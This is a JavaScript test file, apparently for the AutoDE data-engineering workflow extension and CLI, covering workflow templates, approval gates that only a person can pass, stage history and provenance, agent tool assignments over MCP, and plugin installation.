    assert.ok(I.checkWorkflow(noSrc, templates.find((t) => t.id === 'greenfield')).errors.some((e) => /mapping: (depends on sources|consumes source-context)/.test(e)));
    const d = I.diffWorkflow(w, mod);
    assert.ok(d.included.some((x) => x.id === 'conformance') && d.dropped.some((x) => x.id === 'code-conversion'));
  });

  await test('v0.44.0: the runtime from the CLI and MCP — specify, plan gate (a person, never the agent), stages ready by dependency, a gate stage handed in and approved, staleness when an input changes, skip and re-open; the panel and surfaces read the same state', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-wfr-'));
    const W = ['--workspace', ws];
    let client;
    try {
      const id = (await cli(['problems', 'new', 'Migrate the legacy Oracle warehouse to Snowflake', ...W, '--json'])).json().id;
      const prob = nodePath.join(ws, '.autode', 'problems', id);
      let st = (await cli(['workflow', 'status', ...W, '--json'])).json();
      assert.deepStrictEqual([st.template, st.approved, st.stages[0].status, st.stages[1].status], ['modernization v1', false, 'awaiting-approval', 'pending']);
      // The spec is approved in its document (as the panel does): specify is done; plan is next.
      const specFile = nodePath.join(prob, 'spec', 'business-problem.yaml');
      nodeFs.writeFileSync(specFile, nodeFs.readFileSync(specFile, 'utf8').replace('status: draft', 'status: approved').replace('problemStatementApproved: false', 'problemStatementApproved: true'));
      st = (await cli(['workflow', 'status', ...W, '--json'])).json();
      assert.deepStrictEqual([st.stages[0].status, st.next.id], ['done', 'plan']);
      // An agent proposes the workflow; it can't approve it.
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      const p = await call('autode_propose_workflow', {});
      assert.deepStrictEqual([p.decision.kind, p.decision.stakes, p.decision.validation.ok], ['workflow', 'high', true], JSON.stringify(p));
      assert.strictEqual((await call('autode_resolve_decision', { id: p.decision.id, decision: 'approved', by: 'agent' })).code, 'PERMISSION_DENIED');
      assert.strictEqual((await cli(['workflow', 'approve', ...W])).code, 4, 'a terminal is needed');
      const ap = await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] });
      assert.strictEqual(ap.code, 0, ap.out + ap.err);
      st = await call('autode_workflow_status', {});
      const s = (x) => st.stages.find((y) => y.id === x);
      assert.deepStrictEqual([st.approved, s('plan').status, s('sources').status, s('target').status, s('mapping').status], [true, 'done', 'ready', 'ready', 'pending']);
      assert.ok(/waits for sources \(approved\), target \(approved\)/.test(s('mapping').why), s('mapping').why);
      // The CLI and MCP say the same.
      const cliSt = (await cli(['workflow', 'status', ...W, '--json'])).json();
      assert.deepStrictEqual(cliSt.stages.map((x) => [x.id, x.status]), st.stages.map((x) => [x.id, x.status]));
      const next = await call('autode_workflow_next', {});
      assert.ok(/role source-assessor, at most platform-read/.test(next.next.instructions), next.next.instructions);
      // Contexts approved in their documents (as the panel does).
      nodeFs.mkdirSync(nodePath.join(prob, 'context'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'source-context.yaml'), 'specId: x\nspecVersion: 1\nstatus: approved\nsources: []\n');
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'target-context.yaml'), 'specId: x\nspecVersion: 1\nstatus: approved\n');
      // A gate stage handed in by the agent: the check, then a person.
      assert.strictEqual((await call('autode_workflow_complete_stage', { stage: 'quality', summary: 'rules', outputs: ['nope.md'] })).code, 'VALIDATION_FAILED');
      nodeFs.writeFileSync(nodePath.join(ws, 'quality-rules.md'), '# rules\n');
      const q = await call('autode_workflow_complete_stage', { stage: 'quality', summary: 'Rules for every critical attribute', outputs: ['quality-rules.md'] });
      assert.ok(q.decisionId && q.stage.status === 'awaiting-approval', JSON.stringify(q));
      assert.strictEqual((await cli(['workflow', 'approve', 'quality', ...W], { interactive: true, answers: ['approve'] })).code, 0);
      // The mapping, approved in its document; then the source context changes: mapping is stale.
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'mapping-context.yaml'), 'specId: x\nspecVersion: 1\nversion: 1\nstatus: approved\nmappings: []\n');
      st = (await cli(['workflow', 'status', ...W, '--json'])).json();
      assert.deepStrictEqual([s('quality') && st.stages.find((y) => y.id === 'quality').status, st.stages.find((y) => y.id === 'mapping').status], ['done', 'done']);
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'source-context.yaml'), 'specId: x\nspecVersion: 1\nstatus: approved\nsources: [{ connectionId: crm, platform: oracle, method: described }]\n');
      st = (await cli(['workflow', 'status', ...W, '--json'])).json();
      const mp = st.stages.find((y) => y.id === 'mapping');
      assert.deepStrictEqual([mp.status, /source-context changed/.test(mp.why)], ['stale', true], JSON.stringify(mp));
      // Skip: a default stage with a reason; never a mandatory one.
      assert.strictEqual((await cli(['workflow', 'skip', 'reconcile', '--reason', 'deadline', ...W])).code, 4);
      assert.strictEqual((await cli(['workflow', 'skip', 'deploy', '--reason', 'the client cuts over themselves', ...W])).code, 0);
      // Re-open makes everything downstream stale.
      const ro = await cli(['workflow', 'reopen', 'quality', '--reason', 'a new attribute', ...W, '--json']);
      assert.strictEqual(ro.code, 0, ro.err);
      assert.ok(Array.isArray(ro.json().stale));
      const wf = fresh('../dist/engine/workflows/instance.js').readWorkflow(prob);
      assert.deepStrictEqual([wf.status, wf.stages.find((x) => x.id === 'deploy').record.status], ['approved', 'skipped']);
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.44.0: problems from before PA3a migrate — brownfield becomes modernization, greenfield stays greenfield, their approvals are read from their documents; a new template restarts the workflow', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const S = fresh('../dist/engine/workflows/service.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-wfm-'));
    try {
      const mk = (id, extra) => { const d = nodePath.join(ws, '.autode', 'problems', id, 'spec'); nodeFs.mkdirSync(d, { recursive: true }); nodeFs.writeFileSync(nodePath.join(d, 'business-problem.yaml'), `id: bps-${id}\nversion: 2\nstatus: approved\nproblemStatementApproved: true\nproblemStatement: Daily sales reporting for the stores\nobjectives: [daily sales]\nscope: { in: [orders], out: [] }\n${extra}`); };
      mk('old-brown', 'implementationType: brownfield\n');
      mk('old-green', 'implementationType: greenfield\n');
      const brown = S.statusFor({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: 'old-brown' });
      const green = S.statusFor({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: 'old-green' });
      assert.deepStrictEqual([brown.template, green.template], ['modernization v1', 'greenfield v1']);
      assert.deepStrictEqual([brown.stages[0].status, brown.approved, brown.next.id], ['done', false, 'plan'], 'the approved spec carries over; the workflow is approved once');
      // Restart on a template change: the approved modernization is replaced by an estate-merge draft with fresh states.
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: 'old-brown' };
      const d1 = S.proposeWorkflow(scope, S.ensureWorkflow(scope), { host: 'test' });
      await S.approveWorkflow(scope, d1.id, 'priya', 'cli');
      const I = fresh('../dist/engine/workflows/instance.js');
      const T = fresh('../dist/engine/workflows/templates.js');
      const em = T.loadTemplates(wfRes()).templates.find((t) => t.id === 'estate-merge');
      const d2 = S.proposeWorkflow(scope, I.draftWorkflow(em, 'old-brown', I.workflowFacts(ws, undefined), []), { host: 'test' });
      assert.ok(d2.validation.warnings.some((w) => /restarts after the specification/.test(w)), d2.validation.warnings.join('\n'));
      await S.approveWorkflow(scope, d2.id, 'priya', 'cli');
      const after = S.statusFor(scope);
      assert.strictEqual(after.template, 'estate-merge v1');
      assert.ok(after.stages.find((x) => x.id === 'entity-resolution'));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.44.0: the bundled templates pass the template JSON Schema that editors use (yamlValidation)', () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const Ajv = require('ajv');
    const validate = new Ajv({ allErrors: true, strict: false }).compile(JSON.parse(nodeFs.readFileSync(nodePath.join(__dirname, '..', 'docs', 'schemas', 'workflow-template.schema.json'), 'utf8')));
    const { parseYaml } = fresh('../dist/engine/context/Yaml.js');
    for (const f of nodeFs.readdirSync(nodePath.join(__dirname, '..', 'workflows'))) {
      assert.ok(validate(parseYaml(nodeFs.readFileSync(nodePath.join(__dirname, '..', 'workflows', f), 'utf8'))), `${f}: ${JSON.stringify(validate.errors)}`);
    }
    assert.ok(require('../package.json').contributes.yamlValidation.some((y) => /workflow-template/.test(y.url)));
  });

  await test('v0.44.0: the templates ship in the VSIX, the autode package and the stable server copy', () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    assert.ok(nodeFs.readFileSync(nodePath.join(__dirname, '..', '.vscodeignore'), 'utf8').includes('!workflows/*.yaml'));
    assert.ok(require('../scripts/pack-cli.cjs').CONTENT.includes('workflows'));
    // v0.44.1: progress moved to the Workflow view; the palette links to it.
    const html = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'media', 'sidebar.html'), 'utf8');
    assert.ok(html.includes('id="paletteWorkflowLink"') && html.includes("post('openWorkflowView')"));
  });

  // ── v0.44.1: the Workflow view, history and provenance ──

  await test('v0.44.1: the workflow history records who did what — the engine\'s suggestion and draft, a person\'s choice and approvals (with channel), an agent\'s actions, staleness — on every surface', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-wfh-'));
    const W = ['--workspace', ws];
    let client;
    try {
      const id = (await cli(['problems', 'new', 'Migrate the legacy Oracle warehouse to Snowflake', ...W, '--json'])).json().id;
      const prob = nodePath.join(ws, '.autode', 'problems', id);
      const specFile = nodePath.join(prob, 'spec', 'business-problem.yaml');
      nodeFs.writeFileSync(specFile, nodeFs.readFileSync(specFile, 'utf8').replace('status: draft', 'status: approved\napprovedBy: priya').replace('problemStatementApproved: false', 'problemStatementApproved: true'));
      // First use drafts from the engine's suggestion; the person plans it explicitly with a template.
      const plan = await cli(['workflow', 'plan', '--template', 'modernization', ...W, '--by', 'priya', '--json']);
      assert.strictEqual(plan.code, 0, plan.err);
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      const h = (await cli(['workflow', 'history', ...W, '--json'])).json().events;
      const types = h.map((e) => `${e.type}${e.stage ? ':' + e.stage : ''}`);
      for (const want of ['suggested', 'drafted', 'proposed', 'approved', 'approved:specify', 'approved:plan']) assert.ok(types.includes(want), `${want} in ${types.join(', ')}`);
      const suggested = h.find((e) => e.type === 'suggested');
      assert.deepStrictEqual([suggested.actor.kind, /migrat|legacy/.test(suggested.actor.rule)], ['engine', true], 'the suggestion is the engine\'s rule, never a model');
      assert.ok(h.some((e) => e.type === 'drafted' && /chosen by priya/.test(e.reason || '')), 'the person who chose the template');
      const wfApproved = h.find((e) => e.type === 'approved' && !e.stage);
      assert.deepStrictEqual([wfApproved.actor, wfApproved.channel], [{ kind: 'person', name: 'priya' }, 'cli']);
      assert.deepStrictEqual(h.find((e) => e.type === 'approved' && e.stage === 'specify').actor, { kind: 'person', name: 'priya' }, 'read from the document');
      // An agent's actions are labelled as the agent's.
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      await call('autode_workflow_start_stage', { stage: 'quality' });
      await call('autode_workflow_skip_stage', { stage: 'deploy', reason: 'the client cuts over themselves' });
      const agentEvents = (await call('autode_workflow_history', { stage: 'deploy' })).events;
      assert.deepStrictEqual([agentEvents[0].type, agentEvents[0].actor.kind, agentEvents[0].actor.name, agentEvents[0].channel], ['skipped', 'agent', 'autode-tests', 'tool']);
      const text = (await cli(['workflow', 'history', 'quality', ...W])).out;
      assert.ok(/started\s+quality\s+by agent autode-tests via MCP \(tool\)/.test(text), text);
      // Staleness is the engine's, with the reason.
      nodeFs.mkdirSync(nodePath.join(prob, 'context'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'source-context.yaml'), 'specId: x\nspecVersion: 1\nstatus: approved\n');
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'target-context.yaml'), 'specId: x\nspecVersion: 1\nstatus: approved\n');
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'mapping-context.yaml'), 'specId: x\nspecVersion: 1\nversion: 1\nstatus: approved\nmappings: []\n');
      await cli(['workflow', 'status', ...W]);
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'source-context.yaml'), 'specId: x\nspecVersion: 1\nstatus: approved\nsources: [{ connectionId: crm }]\n');
      await cli(['workflow', 'status', ...W]);
      const stale = (await cli(['workflow', 'history', 'mapping', ...W, '--json'])).json().events.find((e) => e.type === 'stale');
      assert.deepStrictEqual([stale.actor.kind, /source-context changed/.test(stale.reason)], ['engine', true]);
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.44.1: the Workflow view model — provenance labels, dependency columns, per-stage actions, the status-bar text', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-wfv-'));
    try {
      const P = fresh('../dist/engine/documents/problems.js');
      const S = fresh('../dist/engine/workflows/service.js');
      const V = fresh('../dist/core/workflowViewModel.js');
      const { id } = P.startProblem(ws, 'Migrate the legacy warehouse and decommission it');
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id };
      let m = V.buildWorkflowModel(scope);
      assert.ok(m.provenance.some((x) => /^Suggested by the engine: modernization \(rule: the specification mentions/.test(x)), m.provenance.join('\n'));
      assert.ok(/plan the workflow/.test(V.statusBarText(m)), V.statusBarText(m));
      const specFile = nodePath.join(ws, '.autode', 'problems', id, 'spec', 'business-problem.yaml');
      nodeFs.writeFileSync(specFile, nodeFs.readFileSync(specFile, 'utf8').replace('status: draft', 'status: approved').replace('problemStatementApproved: false', 'problemStatementApproved: true'));
      const d = S.proposeWorkflow(scope, S.ensureWorkflow(scope), { host: 'vscode' });
      m = V.buildWorkflowModel(scope);
      assert.deepStrictEqual(m.pendingWorkflowDecision.id, d.id);
      assert.ok(/workflow awaits approval/.test(V.statusBarText(m)));
      await S.approveWorkflow(scope, d.id, 'priya', 'panel');
      m = V.buildWorkflowModel(scope);
      const st = (x) => m.stages.find((s) => s.id === x);
      assert.ok(m.provenance.some((x) => /^Approved by priya/.test(x)));
      assert.deepStrictEqual([st('specify').level, st('plan').level, st('sources').level, st('mapping').level], [0, 1, 2, 3], 'columns follow the dependencies');
      assert.deepStrictEqual(st('sources').actions, ['run', 'produce'], 'a mandatory, document-backed stage: its agent or its document, no hand-in or skip (v0.45.1)');
      assert.ok(/Build the source context/.test(st('sources').guide), st('sources').guide);
      assert.deepStrictEqual(st('quality').actions, ['skip'], 'waits for sources: nothing to hand in yet, but a default stage may be skipped');
      assert.deepStrictEqual(st('platform-setup').status, 'skipped');
      assert.ok(st('deploy').actions.includes('skip') && !st('reconcile').actions.includes('skip'));
      assert.deepStrictEqual([m.progress.done, m.progress.total > 8], [2, true]);
      assert.ok(/^AutoDE: .+ · 2\/\d+ · next: /.test(V.statusBarText(m)), V.statusBarText(m));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.44.1: the Workflow view is contributed (tree, editor tab, status bar, menus), its page is CSP-locked, and the palette no longer shows the old phases, agents or Continue button', () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const pkg = require('../package.json');
    assert.ok(pkg.contributes.views.autoDataEngineeringHub.some((v) => v.id === 'autoDataEngineeringHubWorkflow'));
    for (const c of ['openWorkflow', 'refreshWorkflow', 'workflowHandIn', 'workflowSkip', 'workflowReopen', 'workflowApprove', 'workflowApproveAgain']) assert.ok(pkg.contributes.commands.some((x) => x.command === `autoDataEngineeringHub.${c}`), c);
    const approve = pkg.contributes.menus['view/item/context'].find((x) => x.command === 'autoDataEngineeringHub.workflowApprove');
    const re = new RegExp(approve.when.match(/\/(.*)\//)[1]);
    assert.deepStrictEqual([re.test('workflowStage approve skip'), re.test('workflowStage approve-again')], [true, false], 'approve does not match approve-again');
    assert.ok(nodeFs.readFileSync(nodePath.join(__dirname, '..', '.vscodeignore'), 'utf8').includes('!media/workflow.html'));
    const page = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'media', 'workflow.html'), 'utf8');
    assert.ok(/Content-Security-Policy/.test(page) && /script-src 'nonce-\{\{nonce\}\}'/.test(page));
    for (const t of ["type: 'ready'", "'openDecision'", "'approve-document'", 'data-decide', 'History', '<b>Next:</b>']) assert.ok(page.includes(t), t);
    assert.ok(!page.includes('AutoDE agents') && !page.includes('runAgents'), 'v0.45.1: the plan-of-steps box is gone');
    const html = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'media', 'sidebar.html'), 'utf8');
    for (const gone of ['id="palettePhases"', 'id="paletteAgents"', 'id="paletteContinueBtn"']) assert.ok(!html.includes(gone), gone);
    for (const kept of ['id="paletteDecisions"', 'id="paletteArtifacts"', 'id="palettePrimitives"', 'id="paletteContext"']) assert.ok(html.includes(kept), kept);
  });

  // ---------- v0.45.0: PA3b — role templates, skills, assignments, the executor, the plugin ----------

  await test('v0.45.0: the bundled role templates and skills load and pass the format checks; broken ones are refused item by item; a workspace role overrides by name', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const D = fresh('../dist/engine/agents/definitions.js');
    const roles = D.loadRoles(wfRes());
    const pack = D.loadSkillPack(wfRes());
    assert.deepStrictEqual([roles.errors, pack.errors], [[], []]);
    assert.ok(roles.roles.some((r) => r.name === 'documenter' && r.skills.includes('autode-de-documentation') && r.tools.includes('autode_record_artifact')));
    assert.deepStrictEqual(pack.skills.map((k) => k.id).sort(), ['autode-core-document-reading', 'autode-core-fact-extraction', 'autode-core-orchestrator', 'autode-core-vocabulary', 'autode-core-workflow-planning', 'autode-de-conformance', 'autode-de-interview-constraints', 'autode-de-interview-data-flow', 'autode-de-interview-governance', 'autode-de-interview-quality', 'autode-de-interview-requirements', 'autode-de-interview-sources', 'autode-de-interview-transformations', 'autode-de-specification-authoring', 'autode-de-documentation', 'autode-de-mapping', 'autode-de-modelling', 'autode-de-pipeline-build', 'autode-de-quality-rules', 'autode-de-reconciliation', 'autode-de-source-assessment',
      'autode-databricks-deployment', 'autode-databricks-governance', 'autode-databricks-ingestion', 'autode-databricks-performance', 'autode-databricks-pipelines', 'autode-dbt-project',
      'autode-snowflake-deployment', 'autode-snowflake-governance', 'autode-snowflake-ingestion', 'autode-snowflake-performance', 'autode-snowflake-pipelines'].sort());
    assert.deepStrictEqual(D.checkDefinitions(roles.roles, pack.skills), []);
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-roles-'));
    try {
      const dir = nodePath.join(ws, '.autode', 'config', 'agents');
      nodeFs.mkdirSync(dir, { recursive: true });
      nodeFs.writeFileSync(nodePath.join(dir, 'documenter.md'), '---\nname: documenter\ndescription: House-style documenter\ntools: [autode_resolve, autode_record_artifact]\nskills: [autode-de-documentation]\n---\nWrite in our house style.\n');
      nodeFs.writeFileSync(nodePath.join(dir, 'wrong.md'), '---\nname: not-the-file-name\ndescription: x\n---\nbody\n');
      const r = D.loadRoles(wfRes(), ws);
      const doc = r.roles.find((x) => x.name === 'documenter');
      assert.deepStrictEqual([doc.origin.includes('.autode'), doc.description], [true, 'House-style documenter']);
      assert.ok(r.errors.length === 1 && /wrong\.md/.test(r.errors[0]), r.errors.join());
      assert.strictEqual(D.checkSkillFormat('bad', 'Bad_Name', '', '').length, 4, 'name format, folder, description, body');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.0: an assignment gets the tools its tier and role allow — never a destructive or hub-only tool; recording its deliverable at any tier', () => {
    const A = fresh('../dist/engine/agents/assignment.js');
    const t = (name, a) => ({ name, annotations: a });
    const tools = [
      t('autode_resolve', { readOnlyHint: true }), t('autode_propose_mapping', { readOnlyHint: false }), t('autode_list_schemas', { readOnlyHint: true, openWorldHint: true }),
      t('autode_resolve_decision', { destructiveHint: true }), t('autode_workflow_complete_stage', { readOnlyHint: false }), t('autode_record_artifact', { readOnlyHint: false })
    ];
    assert.deepStrictEqual(A.toolsForTier(tools, 'read', []), ['autode_record_artifact', 'autode_resolve']);
    assert.deepStrictEqual(A.toolsForTier(tools, 'propose', []), ['autode_propose_mapping', 'autode_record_artifact', 'autode_resolve']);
    assert.deepStrictEqual(A.toolsForTier(tools, 'workspace-write', []), ['autode_list_schemas', 'autode_propose_mapping', 'autode_record_artifact', 'autode_resolve']);
    assert.deepStrictEqual(A.toolsForTier(tools, 'workspace-write', ['autode_resolve', 'autode_resolve_decision', 'autode_workflow_complete_stage']), ['autode_resolve'], 'a role can narrow, never widen');
  });

  // A workspace template with one documentation stage after the plan, for the end-to-end tests.
  const docsOnly = async (ws, cliFn) => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const dir = nodePath.join(ws, '.autode', 'config', 'workflows');
    nodeFs.mkdirSync(dir, { recursive: true });
    nodeFs.writeFileSync(nodePath.join(dir, 'docs-only.yaml'), 'id: docs-only\nversion: 1\ntitle: Documentation only\ndescription: Document what exists.\nstages:\n  - id: specify\n    title: Specification\n    kind: specify\n    inclusion: mandatory\n  - id: plan\n    title: Plan\n    kind: plan\n    inclusion: mandatory\n    after: [specify (approved)]\n  - id: document\n    title: Documentation\n    kind: document\n    inclusion: mandatory\n    consumes: [spec]\n    after: [plan (approved)]\n');
    const W = ['--workspace', ws];
    const id = (await cliFn(['problems', 'new', 'Document the existing revenue marts', ...W, '--json'])).json().id;
    const prob = nodePath.join(ws, '.autode', 'problems', id);
    const specFile = nodePath.join(prob, 'spec', 'business-problem.yaml');
    nodeFs.writeFileSync(specFile, nodeFs.readFileSync(specFile, 'utf8').replace('status: draft', 'status: approved').replace('problemStatementApproved: false', 'problemStatementApproved: true'));
    const plan = await cliFn(['workflow', 'plan', '--template', 'docs-only', ...W, '--json']);
    assert.strictEqual(plan.code, 0, plan.out + plan.err);
    const ap = await cliFn(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] });
    assert.strictEqual(ap.code, 0, ap.out + ap.err);
    return { id, prob };
  };

  await test('v0.45.0: over MCP — autode_workflow_next carries the full assignment, the agent records its deliverable with a grounding manifest, the history says who; agent prompts for hosts without sub-agents', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-asg-'));
    let client;
    try {
      const { prob } = await docsOnly(ws, cli);
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      const n = await call('autode_workflow_next', {});
      assert.strictEqual(n.next.stage.id, 'document');
      const a = n.assignment;
      assert.deepStrictEqual([a.role, a.tier, a.skills.map((k) => k.id)], ['documenter', 'workspace-write', ['autode-de-documentation']]);
      assert.ok(a.engineTools.includes('autode_record_artifact') && a.engineTools.includes('autode_resolve'));
      assert.ok(!a.engineTools.some((x) => /resolve_decision|apply_decision|workflow_complete_stage|propose_workflow/.test(x)), a.engineTools.join());
      assert.ok(/never call another agent/i.test(a.text) && a.text.includes('## Skill: autode-de-documentation'));
      const r = await call('autode_record_artifact', { stage: 'document', path: 'design.md', content: '# Design\n\nOrders come from shop.orders.\n' });
      assert.ok(/03-build|04-validate/.test(r.path) && r.path.endsWith('document/design.md') && r.manifestPath.endsWith('.grounding.json'), JSON.stringify(r));
      assert.ok(nodeFs.existsSync(nodePath.join(ws, r.path)) && nodeFs.existsSync(nodePath.join(ws, r.manifestPath)));
      await call('autode_record_artifact', { stage: 'document', path: 'design.md', content: '# Design v2\n' });
      assert.strictEqual(nodeFs.readdirSync(nodePath.join(ws, nodePath.dirname(r.path), 'history')).length, 1, 'the previous revision is archived');
      assert.strictEqual((await call('autode_record_artifact', { stage: 'document', path: '../escape.md', content: 'x' })).code, 'VALIDATION_FAILED');
      assert.strictEqual((await call('autode_record_artifact', { stage: 'nope', path: 'a.md', content: 'x' })).code, 'NOT_FOUND');
      const ev = fresh('../dist/engine/workflows/events.js').readEvents(prob, { stage: 'document' }).filter((e) => e.type === 'recorded');
      assert.deepStrictEqual([ev.length, ev[0].actor.kind, ev[0].channel], [2, 'agent', 'tool']);
      const done = await call('autode_workflow_complete_stage', { stage: 'document', summary: 'design.md', outputs: [r.path] });
      assert.ok(done.stage && ['done', 'awaiting-approval'].includes(done.stage.status), JSON.stringify(done));
      // Hosts without sub-agents: the role as a prompt, with a stage the full assignment.
      const prompts = (await client.listPrompts()).prompts.map((p) => p.name);
      assert.ok(prompts.includes('autode_agent_documenter'), prompts.join());
      const plain = await client.getPrompt({ name: 'autode_agent_documenter', arguments: {} });
      assert.ok(/autode_workflow_next/.test(plain.messages[0].content.text));
      const full = await client.getPrompt({ name: 'autode_agent_documenter', arguments: { stage: 'document' } });
      assert.ok(full.messages[0].content.text.startsWith('# Assignment: Documentation'), full.messages[0].content.text.slice(0, 80));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.0: the VS Code executor runs the documenter with the assignment\'s exact tools, hands the stage in as the agent, and refuses cleanly (Claude Code, nothing recorded, no definition)', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-exec-'));
    try {
      const { id, prob } = await docsOnly(ws, cli);
      const { EngineClient } = fresh('../dist/core/engineClient.js');
      const { runStage } = fresh('../dist/core/agentExecutor.js');
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id };
      let seen; let provider = 'claude'; let record = true;
      const host = {
        createEngine: (n) => new EngineClient({ workspaceRoot: ws, resourcesRoot: wfRes(), version: 't', log: () => {}, clientName: n }),
        activeProvider: () => provider,
        log: () => {},
        runAgentWithTools: async (prompt, opts) => {
          seen = { opts, names: opts.engineTools.specs.map((s) => s.name) };
          seen.blocked = await opts.engineTools.call('autode_workflow_complete_stage', { stage: 'document', summary: 'x' });
          if (record) await opts.engineTools.call('autode_record_artifact', { stage: 'document', path: 'runbook.md', content: '# Runbook\n' });
          return { text: 'Recorded runbook.md. Missing: the schedule.', audit: [], provider };
        }
      };
      let r = await runStage(host, scope, 'document');
      assert.ok(!r.ok && /autode plugin install --host claude/.test(r.message), r.message);
      provider = 'copilot'; record = false;
      r = await runStage(host, scope, 'document');
      assert.ok(!r.ok && /without recording a deliverable/.test(r.message), r.message);
      assert.ok(seen.blocked.isError && /not available/.test(seen.blocked.text), 'hub-only tools are not offered, whatever the model asks for');
      assert.strictEqual(seen.opts.systemPrompt.startsWith('# Assignment: Documentation'), true);
      assert.ok(seen.names.includes('autode_record_artifact') && !seen.names.includes('autode_resolve_decision'));
      record = true;
      r = await runStage(host, scope, 'document');
      assert.ok(r.ok && r.outputs.length === 1 && r.outputs[0].endsWith('document/runbook.md'), JSON.stringify(r));
      const events = fresh('../dist/engine/workflows/events.js').readEvents(prob, { stage: 'document' });
      const handed = events.find((e) => e.type === 'handed-in' || e.type === 'done');
      assert.ok(handed && handed.actor.kind === 'agent' && handed.actor.name === 'documenter' && handed.actor.host === 'VS Code', JSON.stringify(events));
      assert.ok(events.some((e) => e.type === 'recorded' && /documenter/.test(e.actor.name)), 'the record names the role');
      r = await runStage(host, scope, 'nope');
      assert.ok(!r.ok);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.0: autode plugin — the plugin folder (Claude Code / Cortex Code layout) and installs for each host, the MCP server wired where the host has a file, other servers kept', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const tmp = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-plug-'));
    try {
      const out = nodePath.join(tmp, 'plugin');
      const p = await cli(['plugin', 'path', '--out', out, '--json']);
      assert.strictEqual(p.code, 0, p.out + p.err);
      const files = p.json().files.sort();
      for (const f of ['.claude-plugin/plugin.json', '.mcp.json', 'agents/documenter.md', 'skills/autode-de-documentation/SKILL.md', 'skills/autode-core-orchestrator/SKILL.md', 'commands/autode-next.md']) assert.ok(files.includes(f), f);
      const manifest = JSON.parse(nodeFs.readFileSync(nodePath.join(out, '.claude-plugin', 'plugin.json'), 'utf8'));
      assert.deepStrictEqual([manifest.name, manifest.version], ['autode', require('../package.json').version]);
      assert.deepStrictEqual(JSON.parse(nodeFs.readFileSync(nodePath.join(out, '.mcp.json'), 'utf8')).mcpServers.autode.args.slice(-3), ['mcp', '--workspace', '.']);
      const agent = nodeFs.readFileSync(nodePath.join(out, 'agents', 'documenter.md'), 'utf8');
      assert.ok(/^tools: Read, Grep, Glob, mcp__autode__/m.test(agent) && !/resolve_decision/.test(agent));
      const ws = nodePath.join(tmp, 'ws'); nodeFs.mkdirSync(ws);
      nodeFs.writeFileSync(nodePath.join(ws, '.mcp.json'), JSON.stringify({ mcpServers: { other: { command: 'x', args: [] } } }));
      const env = { AUTODE_HOME: nodePath.join(tmp, 'home') };
      const c = await cli(['plugin', 'install', '--host', 'claude', '--workspace', ws, '--json'], { env });
      assert.strictEqual(c.code, 0, c.out + c.err);
      const mcp = JSON.parse(nodeFs.readFileSync(nodePath.join(ws, '.mcp.json'), 'utf8'));
      assert.deepStrictEqual(Object.keys(mcp.mcpServers).sort(), ['autode', 'other']);
      assert.ok(nodeFs.existsSync(nodePath.join(ws, '.claude', 'agents', 'documenter.md')) && nodeFs.existsSync(nodePath.join(ws, '.claude', 'skills', 'autode-de-documentation', 'SKILL.md')));
